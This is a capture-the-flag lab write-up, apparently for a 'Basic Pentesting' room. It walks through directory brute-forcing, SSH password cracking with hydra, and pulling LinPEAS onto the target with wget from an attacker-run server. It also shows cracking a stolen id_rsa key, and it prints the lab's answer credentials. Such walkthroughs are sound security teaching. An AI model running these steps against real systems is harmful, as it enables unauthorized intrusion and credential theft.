# Basic Pentesting

## Task 1 - Web App Testing and Privilege Escalation

### Answer the questions below

- Deploy the machine and connect to our network

    `No answer needed`

- Find the services exposed by the machine

    `No answer needed`

- What is the name of the hidden directory on the web server(enter name without /)?

    `development`

    ![hidden-directory](/IMAGES/Basic%20Pentesting/Basic_Pentesting(HiddenDirectory).png)

    Command Command Syntax: `gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt`

- User brute-forcing to find the username & password

    `No answer needed`

    For finding the users we use `enum4linux`:

    ![enum4linux](/IMAGES/Basic%20Pentesting/Basic_Pentesting(enum4linux1).png)

    ![enum4linux](/IMAGES/Basic%20Pentesting/Basic_Pentesting(enum4linux2).png)

    We find two important users namely `jan` and `kay`

- What is the username?

    `jan`

- What is the password?

    `armando`

    Since we knew the username so we run `hydra` to find the password:

    ![username and password](/IMAGES/Basic%20Pentesting/Basic_Pentesting(Bruteforcing).png)

    Basic Command Syntax: `hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh:<url>`

- What service do you use to access the server(answer in abbreviation in all caps)?

    `SSH`

- Enumerate the machine to find any vectors for privilege escalation

    `No answer needed`

- What is the name of the other user you found(all lower case)?

    `kay`

- If you have found another user, what can you do with this information?

    `No answer needed`

- What is the final password you obtain?

    `hereareallystringpasswordthatfollowsthepasswordpolicy$$`

    In order to get this password we did **Privilege Escalation**. For this we use a tool called `LinPeas` and proceed through the following steps:
    - First we download LinPeas tool on our kali machine using the following command: `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh`
    
    - Then we spin up a python server on our kali machine to make this file accessible on the target machine: `python3 -m http.server 8000`

    - On the target machine we move to the temp folder by `cd /tmp` command
    
    - In order to access the `linpeas.sh` file on the target machine we use wget: `wget http://<your-tun0-address>:8000/linpeas.sh` (Replace `<your-tune0-address>` with your vpn address)
    
    - Now we give permissions to the linpeas.sh file and execute it:

        `chmod +x linpeas.sh`

        `./linpeas.sh`

        We find the `id_rsa` file through this: 

        ![id_rsa file](/IMAGES/Basic%20Pentesting/Basic_Pentesting(id_rsa).png)

    - We then copy the rsa_id content and paste it in a file on our host kali machine using `nano`:

        ![copying rsa_id](/IMAGES/Basic%20Pentesting/Basic_Pentesting(copying_id_rsa).png)

    - After that we convert it through `ssh2john` and brute force the password:

        ![brute forcing kay's password](/IMAGES/Basic%20Pentesting/Basic_Pentesting(Running%20john%20for%20extracting%20password%20for%20kay).png)

        The ssh password for kay was found to be `beeswax`

    - Now we login through ssh and extract the final password from `pass.bak` file:

        ![kay's password](/IMAGES/Basic%20Pentesting/Basic_Pentesting(Kay's%20password).png)
    
